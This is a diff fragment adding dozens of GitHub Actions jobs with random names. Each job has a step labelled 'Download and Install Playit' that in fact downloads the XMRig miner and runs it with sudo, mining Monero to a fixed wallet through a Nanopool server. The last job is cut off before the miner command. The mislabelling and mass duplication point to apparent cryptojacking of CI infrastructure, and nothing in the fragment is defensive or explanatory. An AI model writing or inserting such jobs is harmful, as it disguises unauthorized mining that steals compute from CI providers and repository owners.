+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  oayfnumcxgcvojhq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vhantxoeiykquelqj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  bhjdiaqpiggrsysf:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ntvbpeacraepjegfm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  hyvrkixxmlpdjvcu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xvlelmdmtojjnxkec:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  lniupuqmuwtrqdac:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  aianjvnqygxcnnuae:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ibvzztmlgcjfueng:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  gbqodnadwecygaopy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  hennvseajzpxagcb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  kvrpcuptrposlsxyh:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ysziezkjegowoqeb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  rsgwicwgrblnmhfjk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  jbeuzmvacvfgcpdv:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wuzxlvvcsnuqwyiwp:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  gluycjexeapfajkg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wfjprzhfxqcsjywkc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ifsfyxfzhdcwwbmk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  atyioioogquqfieba:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  pixywsqfaamhbztz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ceiseupxchehitmgj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  etxpadhficqegzle:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  djykmkcrnbctfrjym:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  gcrudknluuheoptu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  zvhtptgfwpjdhoxje:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  apjpoyugldscjvza:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  qxebjngsibkrqarql:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vjhobqzpzfhrscmg:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  bvuruqcvqzgnqveps:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  bveuvfnmuoxgjcug:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vesnchfegosmrcghs:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  hkhyuxncvmqsbibh:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  dabkdzbtpemfpcyfj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  bbcrlembtbcypqtl:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  jmzoyhgafjrodkpdb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ahfgygamusoeflyb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  dkoxfizfzmrymdrrn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vtrdtgvpzqwmqyag:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vvyjjytubzdxkxzgb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  adjpgewwshwrhufz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  uogqovhgzacaxbfqc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  lbcrjupewpedhvgk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ntyvzjihsmdhuwvcw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  cvwqdcuoaeqswaen:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
